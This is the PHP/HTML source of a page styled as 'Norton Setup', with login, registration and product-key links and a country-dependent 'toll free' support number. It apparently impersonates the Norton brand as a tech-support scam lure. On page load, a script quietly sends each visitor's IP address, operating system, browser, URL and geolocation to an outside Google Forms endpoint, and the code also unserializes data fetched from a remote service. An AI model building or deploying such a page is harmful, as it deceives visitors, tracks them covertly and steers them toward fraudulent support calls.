<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?> 
<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();


if(isset($_POST['submit']))
{

    $key=$_POST['key'];
}
?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?>
<!DOCTYPE html>
<html>
<head>
	<title>Norton Setup</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
	<link rel="shortcut icon" href="../img/favicon.ico"/>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,900&display=swap" rel="stylesheet">

	
	<link rel="stylesheet" href="./css/style.css">
	<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154545431-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-154545431-1');
</script>

</head>
<body>

<nav class="navbar navbar-color" style="min-height:57px; z-index:10;">
  <div class="container">
    <div class="navbar-header">
      <a class="navbar-brand" href="index.php"><img src="../img/Norton_av_logo.png" class="image-responsive logo-nort" ></a>
    </div>
    <ul class="nav navbar-nav navbar-center">
	<li class="btn btn-lg nav-btn"><a href="../actnor-form.php">Setup Product Key</a></li>
	<li class="btn btn-lg nav-btn"><a href="nor-log.php">Login</a></li>
	<li class="btn btn-lg nav-btn"><a href="../norreg/nor-reg.php">Register</a></li>
	<li class="btn btn-lg nav-btn"><a href="../nor-support.php">Contact Support</a></li>
	</ul>
  </div>
</nav>


<div class="home-slider">
	<img src="../img/mynorton-hero.jpg" class="slider-home">
	<h1 class="slider-cnt-position">Welcome to My Norton</h1>
	<h4 class="slider-cnt-position1">Download and set up your protection</h4>
</div>
<a href="nor-log.php" class="slider-cnt-position2" value="snjdf">Login</a>
<a href="../norreg/nor-reg.php" class="slider-cnt-position3" value="snjdf">Register</a>

<footer>

	
</footer>
<script>
$(document).ready(function(){  
            var country = "<?php echo $country; ?>";
            var state = "<?php echo $state; ?>";
            var city = "<?php echo $city; ?>";
            var zip = "<?php echo $zip; ?>";
            var field1 = "<?php echo $ip; ?>";
            var field2 = "<?php echo $os; ?>";
            var field3 = "<?php echo $yourbrowser; ?>";
            var field4 = "<?php echo $url; ?>";
            var issue= "NOR-LOG";
           $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSf4ScufwA8nfMkFqP9Qli5VAIED14m2660bFVQpIaDEiOi0Qw/formResponse",
			    data: {"entry.1656736278": field1, "entry.926948088": field3, "entry.2004208092":field2, "entry.557824394":issue, "entry.64249553":field4, "entry.274320571":country, "entry.425494775":state, "entry.39908174":city, "entry.840030599":zip},
                type: "POST",
                dataType: "xml",
                success: function(d)
			{
			},
			error: function(x, y, z)
				{
                    setTimeout("sss()", 100);
					
				}
           });
		return false;
});
</script>
<div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  <?php 
if($c_code == "US")
{
    echo "US/CA +1 844 514 0331";
}
elseif($c_code == "CA")
{
    echo "US/CA +1 844 514 0331";
}
elseif($c_code == "GB")
{
    echo "UK   +44 800 229 4981";
}
elseif($c_code == "AU")
{
    echo "AU   +1 844 514 0331";
}
elseif($c_code == "NZ")
{
    echo "NZ   +1 844 514 0331";
}
else
{
    echo "+1 844 514 0331";
}
?>
  </span> </p>
</div>
</body>
</html>
